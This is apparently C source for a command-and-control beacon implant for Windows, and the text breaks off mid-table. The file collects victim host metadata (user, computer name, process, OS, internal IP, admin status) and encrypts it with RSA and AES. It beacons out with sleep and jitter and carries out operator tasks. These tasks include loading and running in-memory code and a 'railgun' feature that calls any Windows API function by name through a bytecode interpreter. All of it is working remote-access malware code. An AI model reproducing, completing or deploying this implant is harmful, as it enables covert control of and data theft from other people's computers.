#define SECURITY_WIN32

#include <windows.h>
#include <security.h>
#include <secext.h>
#include <iphlpapi.h>
#include "agent.h"
#include "udc2.h"
#include "tcg.h"

DECLSPEC_IMPORT BOOL     WINAPI  ADVAPI32$AllocateAndInitializeSid   ( PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID *);
DECLSPEC_IMPORT BOOL     WINAPI  ADVAPI32$CheckTokenMembership       ( HANDLE, PSID, PBOOL );
DECLSPEC_IMPORT PVOID    WINAPI  ADVAPI32$FreeSid                    ( PSID );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptGenRandom              ( BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptOpenAlgorithmProvider  ( BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptImportKeyPair          ( BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptGenerateSymmetricKey   ( BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptSetProperty            ( BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptEncrypt                ( BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptDecrypt                ( BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptCloseAlgorithmProvider ( BCRYPT_ALG_HANDLE, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptDestroyKey             ( BCRYPT_KEY_HANDLE );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptCreateHash             ( BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptHashData               ( BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptFinishHash             ( BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptDestroyHash            ( BCRYPT_HASH_HANDLE );
DECLSPEC_IMPORT BOOL     WINAPI  CRYPT32$CryptDecodeObjectEx         ( DWORD, LPCSTR, const BYTE *, DWORD, DWORD, PCRYPT_DECODE_PARA, void *, DWORD * );
DECLSPEC_IMPORT BOOL     WINAPI  CRYPT32$CryptImportPublicKeyInfoEx2 ( DWORD, PCERT_PUBLIC_KEY_INFO, DWORD, void *, BCRYPT_KEY_HANDLE * );
DECLSPEC_IMPORT HLOCAL   WINAPI  KERNEL32$LocalFree                  ( HLOCAL );
DECLSPEC_IMPORT void     WINAPI  KERNEL32$ExitProcess                ( UINT );
DECLSPEC_IMPORT void     WINAPI  KERNEL32$ExitThread                 ( DWORD );
DECLSPEC_IMPORT void     WINAPI  KERNEL32$Sleep                      ( DWORD );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$GetComputerNameExA         ( COMPUTER_NAME_FORMAT, LPSTR, LPDWORD );
DECLSPEC_IMPORT HMODULE  WINAPI  KERNEL32$GetModuleHandleA           ( LPCSTR );
DECLSPEC_IMPORT DWORD    WINAPI  KERNEL32$GetModuleFileNameA         ( HMODULE, LPSTR, DWORD );
DECLSPEC_IMPORT DWORD    WINAPI  KERNEL32$GetCurrentProcessId        ( );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$GetVersionExA              ( LPOSVERSIONINFOA );
DECLSPEC_IMPORT UINT     WINAPI  KERNEL32$GetACP                     ( );
DECLSPEC_IMPORT LPVOID   WINAPI  KERNEL32$VirtualAlloc               ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$VirtualProtect             ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$VirtualFree                ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT ULONG    WINAPI  IPHLPAPI$GetAdaptersInfo            ( PIP_ADAPTER_INFO, PULONG );
DECLSPEC_IMPORT BOOLEAN  WINAPI  SECUR32$GetUserNameExA              ( EXTENDED_NAME_FORMAT, LPSTR, PULONG );
DECLSPEC_IMPORT u_short  WINAPI  WS2_32$ntohs                        ( u_short );
DECLSPEC_IMPORT u_long   WINAPI  WS2_32$ntohl                        ( u_long );
DECLSPEC_IMPORT u_long   WINAPI  WS2_32$htonl                        ( u_long );
DECLSPEC_IMPORT void *   WINAPIV MSVCRT$malloc                       ( size_t );
DECLSPEC_IMPORT void     WINAPIV MSVCRT$free                         ( void * );
DECLSPEC_IMPORT int      WINAPIV MSVCRT$vsnprintf                    ( char *, size_t, const char *, va_list );
DECLSPEC_IMPORT char *   WINAPIV MSVCRT$strrchr                      ( const char *, int );
DECLSPEC_IMPORT size_t   WINAPIV MSVCRT$strlen                       ( const char * );
DECLSPEC_IMPORT int      WINAPIV MSVCRT$strcmp                       ( const char *, const char * );

#define memset(x, y, z) __stosb( ( UCHAR * ) x, y, z );
#define memcpy(x, y, z) __movsb( ( UCHAR * ) x, ( UCHAR * ) y, z );

#define MAX_RECV_SIZE 1024 * 1024

config   g_config;
metadata g_metadata;
UINT     g_current_task_id = 0;
BOOL     g_running = TRUE;

void setup_config( char * pack, int pack_len )
{
    memset( &g_config, 0, sizeof ( config ) );

    datap parser;
    BeaconDataParse( &parser, pack, pack_len );

    int sleep     = BeaconDataInt( &parser );
    int jitter    = BeaconDataInt( &parser );
    int exit_func = BeaconDataInt( &parser );

    int    key_len;
    char * key = BeaconDataExtract( &parser, &key_len );

    /* crystal palace pack uses little-endian */

    g_config.sleep     = WS2_32$htonl( sleep );
    g_config.jitter    = WS2_32$htonl( jitter );
    g_config.key_len   = WS2_32$htonl( key_len );
    g_config.exit_func = WS2_32$htonl( exit_func );

    memcpy( g_config.rsa_key, key, g_config.key_len );

    /*
    * don't need to worry about freeing the parser
    * because the data is freed with the loader
    */
}

void go( char * loader )
{
    free_memory( loader );
    generate_metadata( );
    udc2_init( );

    while ( g_running )
    {
        formatp out_data;
        format_checkin( &out_data );

        size_t in_data_len = MAX_RECV_SIZE;
        char * in_data     = MSVCRT$malloc( in_data_len );

        udc2_go( out_data.original, out_data.size, in_data, &in_data_len );

        if ( in_data && in_data_len > 0 ) {
            process_messages( in_data, in_data_len );
        }

        MSVCRT$free( in_data );

        if ( !g_running ) {
            break;
        }

        /* calculate sleep time */
        DWORD sleep_ms = g_config.sleep * 1000;

        if ( g_config.jitter > 0 && g_config.sleep > 0 )
        {
            DWORD max_delta = sleep_ms * g_config.jitter / 100;

            if ( max_delta > 0 )
            {
                UINT rand_val = random_uint( );
                LONG delta    = ( LONG ) ( rand_val % ( max_delta * 2 + 1 ) ) - ( LONG ) max_delta;
                LONG result   = ( LONG ) sleep_ms + delta;
                sleep_ms      = result > 0 ? ( DWORD ) result : 0;
            }
        }

        KERNEL32$Sleep( sleep_ms );
    }

    udc2_free( );
    
    if ( g_config.exit_func == 1 ) {
        KERNEL32$ExitProcess( 0 );
    } else {
        KERNEL32$ExitThread( 0 );
    }
}

void format_checkin( formatp * parser )
{
    size_t total_len = sizeof( int )      /* callback type */
                     + sizeof( UINT )     /* dummy task id */
                     + sizeof( int )      /* metadata length */
                     + g_metadata.length; /* metadata */

    BeaconFormatAlloc  ( parser, total_len );
    BeaconFormatInt    ( parser, CALLBACK_METADATA );
    BeaconFormatInt    ( parser, 0 );
    BeaconFormatInt    ( parser, g_metadata.length );
    BeaconFormatAppend ( parser, g_metadata.data, g_metadata.length );
}

void generate_metadata( )
{
    #define MAX_LEN 256

    memset( &g_metadata, 0, sizeof( metadata ) );

    g_metadata.bid = random_uint( );

    random_bytes( ( UCHAR * ) g_metadata.aes_key, AES_KEY_LEN );

    char user_name[ MAX_LEN ];
    ULONG user_name_len = MAX_LEN;
    SECUR32$GetUserNameExA( NameSamCompatible, user_name, &user_name_len );

    char comp_name [ MAX_LEN ];
    ULONG comp_name_len = MAX_LEN;
    KERNEL32$GetComputerNameExA( ComputerNameDnsFullyQualified, comp_name, &comp_name_len );

    char module_path[ MAX_PATH ];
    KERNEL32$GetModuleFileNameA( NULL, module_path, MAX_PATH );

    char * process_name = MSVCRT$strrchr( module_path, '\\' );
    process_name = process_name ? process_name + 1 : module_path;
    int process_name_len = MSVCRT$strlen( process_name );

    int pid = KERNEL32$GetCurrentProcessId( );

    OSVERSIONINFO os_ver;
    memset( &os_ver, 0, sizeof( OSVERSIONINFO ) );
    
    os_ver.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );
    KERNEL32$GetVersionExA( &os_ver );

    UINT code_page   = KERNEL32$GetACP( );
    UINT internal_ip = get_internal_ip( );

    char flags = 0;

    if ( !IS_X64( ) ) {
        flags |= METADATA_FLAG_X86;
    }

    if ( BeaconIsAdmin( ) ) {
        flags |= METADATA_FLAG_ADMIN;
    }

    /* calculate total length of all metadata fields (strings are length-prefixed) */
    g_metadata.length = sizeof( UINT )                   /* bid */
                      + AES_KEY_LEN                      /* aes key */
                      + sizeof( int ) + user_name_len    /* len + username */
                      + sizeof( int ) + comp_name_len    /* len + computer name */
                      + sizeof( int ) + process_name_len /* len + process name */
                      + sizeof( int )                    /* pid */
                      + sizeof( DWORD )                  /* major */
                      + sizeof( DWORD )                  /* minor */
                      + sizeof( DWORD )                  /* build */
                      + sizeof( UINT  )                  /* code page */
                      + 4                                /* ipv4 */
                      + sizeof( char );                  /* flags */

    formatp metadata;
    BeaconFormatAlloc  ( &metadata, g_metadata.length );
    BeaconFormatInt    ( &metadata, g_metadata.bid );
    BeaconFormatAppend ( &metadata, g_metadata.aes_key, AES_KEY_LEN );
    BeaconFormatInt    ( &metadata, user_name_len );
    BeaconFormatAppend ( &metadata, user_name, user_name_len );
    BeaconFormatInt    ( &metadata, comp_name_len );
    BeaconFormatAppend ( &metadata, comp_name, comp_name_len );
    BeaconFormatInt    ( &metadata, process_name_len );
    BeaconFormatAppend ( &metadata, process_name, process_name_len );
    BeaconFormatInt    ( &metadata, pid );
    BeaconFormatInt    ( &metadata, os_ver.dwMajorVersion );
    BeaconFormatInt    ( &metadata, os_ver.dwMinorVersion );
    BeaconFormatInt    ( &metadata, os_ver.dwBuildNumber );
    BeaconFormatInt    ( &metadata, code_page );
    BeaconFormatInt    ( &metadata, internal_ip );
    BeaconFormatAppend ( &metadata, ( char * ) &flags, sizeof ( char ) );

    /* encrypt with rsa key */
    ULONG enc_len = sizeof( g_metadata.data );
    rsa_encrypt( ( UCHAR * ) metadata.original, ( ULONG ) g_metadata.length, ( UCHAR * ) g_metadata.data, &enc_len );
    g_metadata.length = enc_len;

    BeaconFormatFree( &metadata );
}

UINT random_uint( )
{
    UINT value = 0;
    random_bytes( ( PUCHAR ) &value, sizeof ( value ) );
    return value;
}

void random_bytes( UCHAR * buffer, size_t len )
{
    BCRYPT$BCryptGenRandom( NULL, ( PUCHAR ) buffer, ( ULONG ) len, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
}

BOOL rsa_encrypt( UCHAR * plaintext, ULONG plaintext_len, UCHAR * ciphertext, ULONG * ciphertext_len )
{
    BCRYPT_KEY_HANDLE      key      = NULL;
    CERT_PUBLIC_KEY_INFO * pub_info = NULL;
    NTSTATUS               status;
    BOOL                   result   = FALSE;

    /* decode SubjectPublicKeyInfo DER -> CERT_PUBLIC_KEY_INFO (heap-allocated) */
    DWORD pub_info_len = 0;
    if ( !CRYPT32$CryptDecodeObjectEx( X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, ( const BYTE * ) g_config.rsa_key, g_config.key_len, CRYPT_DECODE_ALLOC_FLAG, NULL, &pub_info, &pub_info_len ) ) {
        goto cleanup;
    }

    /* import into CNG as a BCRYPT_KEY_HANDLE */
    if ( !CRYPT32$CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING, pub_info, 0, NULL, &key ) ) {
        goto cleanup;
    }

    /* query output size */
    status = BCRYPT$BCryptEncrypt( key, plaintext, plaintext_len, NULL, NULL, 0, NULL, 0, ciphertext_len, BCRYPT_PAD_PKCS1 );
    
    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }    

    status = BCRYPT$BCryptEncrypt( key, plaintext, plaintext_len, NULL, NULL, 0, ciphertext, *ciphertext_len, ciphertext_len, BCRYPT_PAD_PKCS1 );
    
    if ( NT_SUCCESS( status )) {
        result = TRUE;
    }

cleanup:
    if ( key      ) BCRYPT$BCryptDestroyKey ( key );
    if ( pub_info ) KERNEL32$LocalFree      ( pub_info );

    return result;
}

BOOL aes_encrypt ( UCHAR * plaintext, ULONG plaintext_len, UCHAR * key, UCHAR * iv, UCHAR * ciphertext, ULONG * ciphertext_len )
{
    BCRYPT_ALG_HANDLE alg  = NULL;
    BCRYPT_KEY_HANDLE hkey = NULL;
    BOOL     result        = FALSE;
    NTSTATUS status;

    /*
     * BCryptEncrypt updates the IV buffer in-place (CBC chaining).
     * Use a local copy so the caller's IV is not modified and can be
     * safely used for the HMAC and wire format after this call returns.
     */
    UCHAR iv_copy[ AES_KEY_LEN ];
    memcpy( iv_copy, iv, AES_KEY_LEN );

    status = BCRYPT$BCryptOpenAlgorithmProvider( &alg, BCRYPT_AES_ALGORITHM, NULL, 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptSetProperty( alg, BCRYPT_CHAINING_MODE, ( PUCHAR ) BCRYPT_CHAIN_MODE_CBC, sizeof ( BCRYPT_CHAIN_MODE_CBC ), 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptGenerateSymmetricKey( alg, &hkey, NULL, 0, key, AES_KEY_LEN, 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    /* query output size (includes PKCS7 padding to next block boundary) */
    status = BCRYPT$BCryptEncrypt( hkey, plaintext, plaintext_len, NULL, iv_copy, AES_KEY_LEN, NULL, 0, ciphertext_len, BCRYPT_BLOCK_PADDING );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    memcpy( iv_copy, iv, AES_KEY_LEN ); /* restore for the actual encrypt call */

    status = BCRYPT$BCryptEncrypt( hkey, plaintext, plaintext_len, NULL, iv_copy, AES_KEY_LEN, ciphertext, * ciphertext_len, ciphertext_len, BCRYPT_BLOCK_PADDING );

    if ( NT_SUCCESS( status )) {
        result = TRUE;
    }

cleanup:
    if ( hkey ) BCRYPT$BCryptDestroyKey             ( hkey );
    if ( alg  ) BCRYPT$BCryptCloseAlgorithmProvider ( alg, 0 );

    return result;
}

BOOL aes_decrypt( UCHAR * ciphertext, ULONG ciphertext_len, UCHAR * key, UCHAR * iv, UCHAR * plaintext, ULONG * plaintext_len )
{
    BCRYPT_ALG_HANDLE alg  = NULL;
    BCRYPT_KEY_HANDLE hkey = NULL;
    NTSTATUS status;
    BOOL result            = FALSE;

    UCHAR iv_copy[ AES_KEY_LEN ];
    memcpy( iv_copy, iv, AES_KEY_LEN );

    status = BCRYPT$BCryptOpenAlgorithmProvider( &alg, BCRYPT_AES_ALGORITHM, NULL, 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptSetProperty( alg, BCRYPT_CHAINING_MODE, ( PUCHAR ) BCRYPT_CHAIN_MODE_CBC, sizeof ( BCRYPT_CHAIN_MODE_CBC ), 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptGenerateSymmetricKey( alg, &hkey, NULL, 0, key, AES_KEY_LEN, 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptDecrypt( hkey, ciphertext, ciphertext_len, NULL, iv_copy, AES_KEY_LEN, plaintext, * plaintext_len, plaintext_len, BCRYPT_BLOCK_PADDING );

    if ( NT_SUCCESS( status )) {
        result = TRUE;   
    }

cleanup:
    if ( hkey ) BCRYPT$BCryptDestroyKey             ( hkey );
    if ( alg  ) BCRYPT$BCryptCloseAlgorithmProvider ( alg, 0 );

    return result;
}

BOOL compute_hmac( UCHAR * data, ULONG data_len, UCHAR * key, ULONG key_len, UCHAR * hmac )
{
    BCRYPT_ALG_HANDLE  alg  = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    BOOL     result         = FALSE;
    NTSTATUS status;

    status = BCRYPT$BCryptOpenAlgorithmProvider( &alg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptCreateHash( alg, &hash, NULL, 0, key, key_len, 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptHashData( hash, data, data_len, 0 );

    if ( !NT_SUCCESS( status )) {
        goto cleanup;
    }

    status = BCRYPT$BCryptFinishHash( hash, hmac, HMAC_LEN, 0 );

    if ( NT_SUCCESS( status )) {
        result = TRUE;
    }

cleanup:
    if ( hash ) BCRYPT$BCryptDestroyHash            ( hash );
    if ( alg  ) BCRYPT$BCryptCloseAlgorithmProvider ( alg, 0 );

    return result;
}

UINT get_internal_ip( )
{
    /* initialise as 127.0.0.1 */
    UINT ip = 0x0100007f;

    ULONG buffer_len = 0;
    IPHLPAPI$GetAdaptersInfo( NULL, &buffer_len );

    if ( buffer_len == 0 ) {
        return ip;
    }

    PIP_ADAPTER_INFO adapters = ( PIP_ADAPTER_INFO )MSVCRT$malloc( buffer_len );

    if ( !adapters ) {
        return ip;
    }
    
    if ( IPHLPAPI$GetAdaptersInfo( adapters, &buffer_len ) == NO_ERROR )
    {
        PIP_ADAPTER_INFO adapter = adapters;

        while ( adapter )
        {
            char * str = adapter->IpAddressList.IpAddress.String;

            if ( str [ 0 ] != '\0' && ! ( str [ 0 ] == '0' && str [ 1 ] == '.' && str [ 2 ] == '0' ) && adapter->Type != MIB_IF_TYPE_LOOPBACK )
            {
                ULONG o [ 4 ] = { 0 };
                int idx = 0;

                for ( int i = 0; str [ i ] != '\0' && idx < 4; i++ )
                {
                    if ( str [ i ] == '.' )
                    {
                        idx++;
                    }
                    else
                    {
                        o [ idx ] = o [ idx ] * 10 + ( str [ i ] - '0' );
                    }
                }

                ip = o [ 0 ] | ( o [ 1 ] << 8 | ( o [ 2 ] << 16 ) | ( o [ 3 ] << 24 ) );
                break;
            }

            adapter = adapter->Next;
        }
    }

    MSVCRT$free( ( void * ) adapters );
    return ip;
}

void process_messages( char * data, size_t len )
{
    datap msg_parser;
    BeaconDataParse( &msg_parser, data, len );

    do
    {
        /* enc_data = hmac (32) | iv (16) | ciphertext */
        int    enc_data_len;
        char * enc_data = BeaconDataExtract( &msg_parser, &enc_data_len );

        if ( enc_data_len < HMAC_LEN + AES_KEY_LEN ) {
            continue;
        }

        /* verify hmac and decrypt using g_metadata.aes_key */
        UCHAR * hmac       = ( UCHAR * ) enc_data;
        UCHAR * iv         = ( UCHAR * ) enc_data + HMAC_LEN;
        UCHAR * ciphertext = ( UCHAR * ) enc_data + HMAC_LEN + AES_KEY_LEN;

        /* verify hmac */
        UCHAR expected_hmac[ HMAC_LEN ];

        if ( !compute_hmac( iv, enc_data_len - HMAC_LEN, ( UCHAR * ) g_metadata.aes_key, AES_KEY_LEN, expected_hmac )) {
            continue;
        }
        
        BOOL hmac_ok = TRUE;

        for ( DWORD i = 0; i < HMAC_LEN; i++ )
        {
            if ( hmac[ i ] != expected_hmac[ i ] )
            {
                hmac_ok = FALSE;
                break;
            }
        }

        if ( !hmac_ok ) {
            /* maybe send a message back here? */
            continue;
        }

        /* decrypt task data */
        ULONG plaintext_len = enc_data_len;
        UCHAR * plaintext   = MSVCRT$malloc( plaintext_len );

        if ( !plaintext ) {
            continue;
        }

        if ( !aes_decrypt( ciphertext, enc_data_len - HMAC_LEN - AES_KEY_LEN, ( UCHAR * ) g_metadata.aes_key, iv, plaintext, &plaintext_len ))
        {
            MSVCRT$free( plaintext );
            continue;
        }

        /* parse the task data */
        datap task_parser;
        BeaconDataParse( &task_parser, ( char * ) plaintext, plaintext_len );

        g_current_task_id = ( UINT )BeaconDataInt( &task_parser );
        int task_type     = BeaconDataInt( &task_parser );

        int    task_data_len;
        char * task_data = BeaconDataExtract( &task_parser, &task_data_len );

        switch ( task_type )
        {
        case TASK_EXIT:
            exit_beacon( );
            break;

        case TASK_SLEEP:
            set_sleep( task_data, task_data_len );
            break;

        case TASK_PICO:
            execute_pico( task_data, task_data_len );
            break;

        case TASK_RAILGUN:
            execute_railgun( task_data, task_data_len );
            break;

        default:
            break;
        }

        MSVCRT$free( plaintext );

    } while ( BeaconDataLength( &msg_parser ) > 0 );
}

void execute_pico( char * data, int len )
{
    int    pico_len;
    char * pico_src;
    char * pico_code;
    char * pico_data;
    int    args_len;
    char * args;
    bfuncs funcs;
    DWORD  old_protect;

    datap parser;
    BeaconDataParse( &parser, data, len );
    
    pico_src = BeaconDataExtract( &parser, &pico_len );
    args     = BeaconDataExtract( &parser, &args_len );

    pico_code = allocate_memory( PicoCodeSize( pico_src ), PAGE_READWRITE );
    pico_data = allocate_memory( PicoDataSize( pico_src ), PAGE_READWRITE );

    funcs.LoadLibraryA         = LoadLibraryA;
    funcs.GetProcAddress       = GetProcAddress;
    funcs.BeaconDataParse      = BeaconDataParse;
    funcs.BeaconDataExtract    = BeaconDataExtract;
    funcs.BeaconDataPtr        = BeaconDataPtr;
    funcs.BeaconDataShort      = BeaconDataShort;
    funcs.BeaconDataInt        = BeaconDataInt;
    funcs.BeaconDataLength     = BeaconDataLength;
    funcs.BeaconFormatAlloc    = BeaconFormatAlloc;
    funcs.BeaconFormatInt      = BeaconFormatInt;
    funcs.BeaconFormatPrintf   = BeaconFormatPrintf;
    funcs.BeaconFormatToString = BeaconFormatToString;
    funcs.BeaconFormatReset    = BeaconFormatReset;
    funcs.BeaconFormatFree     = BeaconFormatFree;
    funcs.BeaconPrintf         = BeaconPrintf;
    funcs.BeaconOutput         = BeaconOutput;

    PicoLoad( ( IMPORTFUNCS * ) &funcs, pico_src, pico_code, pico_data );
    KERNEL32$VirtualProtect( pico_code, PicoCodeSize( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    ( ( PICO_GO )( PicoEntryPoint( pico_src, pico_code ) )) ( args, args_len );

    free_memory( pico_code );
    free_memory( pico_data );
}

/* -----------------------------------------------------------------------
 * Railgun: call an arbitrary Windows API export by name.
 *
 * Wire format (all integers big-endian, matching BeaconDataInt / BofPack):
 *   [4+N] dll_name  (BofPack 'z': 4-byte BE len including null, then bytes)
 *   [4+N] func_name (same)
 *   [4]   nargs     (BofPack 'i')
 *   per arg:
 *     [1]   type  'i'=DWORD zero-ext, 'p'=DWORD sign-ext, 'z'=ANSI str,
 *                 'Z'=wide str, 'b'=blob, 'o'=out-buf (alloc+return)
 *     'i','p': [4] value (BE int)
 *     'z','Z','b': [4+N] length-prefixed blob (BeaconDataExtract)
 *     'o': [4] out-buffer size to allocate (BE int)
 *
 * x64: single calling convention; safe to cast to any fixed-arity fn ptr.
 * x86: __stdcall (callee cleans up) requires exact arg count at call site.
 *      We dispatch through a typed switch so the compiler emits the right
 *      stack frame.  __cdecl exports are unsupported on x86.
 * ----------------------------------------------------------------------- */

#if !defined WIN_X64

typedef ULONG_PTR (__stdcall * rg_fn_0 )();
typedef ULONG_PTR (__stdcall * rg_fn_1 )(ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_2 )(ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_3 )(ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_4 )(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_5 )(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_6 )(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_7 )(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_8 )(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_9 )(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_10)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_11)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
typedef ULONG_PTR (__stdcall * rg_fn_12)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);

static ULONG_PTR rgs_call_x86( FARPROC fn, ULONG_PTR * a, int n )
{
    switch ( n )
    {
    case  0: return (( rg_fn_0  ) fn)();
    case  1: return (( rg_fn_1  ) fn)( a[0] );
    case  2: return (( rg_fn_2  ) fn)( a[0], a[1] );
    case  3: return (( rg_fn_3  ) fn)( a[0], a[1], a[2] );
    case  4: return (( rg_fn_4  ) fn)( a[0], a[1], a[2], a[3] );
    case  5: return (( rg_fn_5  ) fn)( a[0], a[1], a[2], a[3], a[4] );
    case  6: return (( rg_fn_6  ) fn)( a[0], a[1], a[2], a[3], a[4], a[5] );
    case  7: return (( rg_fn_7  ) fn)( a[0], a[1], a[2], a[3], a[4], a[5], a[6] );
    case  8: return (( rg_fn_8  ) fn)( a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7] );
    case  9: return (( rg_fn_9  ) fn)( a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8] );
    case 10: return (( rg_fn_10 ) fn)( a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9] );
    case 11: return (( rg_fn_11 ) fn)( a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10] );
    default: return (( rg_fn_12 ) fn)( a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10], a[11] );
    }
}

#endif /* !WIN_X64 */

#define RAILGUN_MAX_ARGS 12

/* -----------------------------------------------------------------------
 * Railgun Script interpreter.
 *
 * The client compiles a C-like script to compact bytecode; we execute it
 * here.  All values are ULONG_PTR (pointer-width) on a small value stack.
 * A parallel type-tag stack tracks which entries are heap pointers so we
 * can free them on early exit.
 *
 * Payload layout:
 *   [1]  num_dlls
 *   per dll:
 *     [1]  name_len (including null)
 *     [N]  dll_name (ANSI, null-terminated)
 *   [1]  num_vars
 *   [2 LE] code_len
 *   [code_len] bytecode
 *
 * Opcodes: see RGS_OP_* defines in agent.h
 * Arg types in CALL instruction: 'v'=value, 's'=heap string, 'o'=out-buf
 * ----------------------------------------------------------------------- */

#define RGS_STACK_MAX 64
#define RGS_VARS_MAX  64
#define RGS_DLLS_MAX  16

/* type tags on the value stack â€” 'v', 's', 'o' */
#define RGS_TAG_VAL 'v'
#define RGS_TAG_STR 's'
#define RGS_TAG_OUT 'o'

static inline unsigned char rgs_u8( const char ** pc, const char * end )
{
    return ( *pc < end ) ? ( unsigned char ) *( *pc ) ++ : 0;
}

static inline unsigned short rgs_u16le( const char ** pc, const char * end )
{
    unsigned char lo = rgs_u8( pc, end );
    unsigned char hi = rgs_u8( pc, end );
    return ( unsigned short )( lo | ( hi << 8 ) );
}

static inline unsigned long long rgs_u64le( const char ** pc, const char * end )
{
    unsigned long long v = 0;
    for ( int i = 0; i < 8; i++ )
        v |= ( unsigned long long ) rgs_u8( pc, end ) << ( i * 8 );
    return v;
}

/* Case-insensitive match for the "beacon" pseudo-DLL name. */
static int rgs_is_beacon_dll( const char * name )
{
    const char * b = "beacon";
    while ( *b ) {
        char c = *name;
        if ( c >= 'A' && c <= 'Z' ) c += 32;
        if ( c != *b ) return 0;
        name++; b++;
    }
    return *name == '\0';
}

/* Resolves a Beacon internal API function by name.
 * Returns a FARPROC that can be called via the 12-arg railgun_fn convention. */
static FARPROC rgs_lookup_beacon_fn( const char * name )
{
    typedef struct { const char * n; FARPROC f; } rgs_bi;
    const rgs_bi tbl[] = {
        { "BeaconPrintf",  ( FARPROC ) BeaconPrintf  },
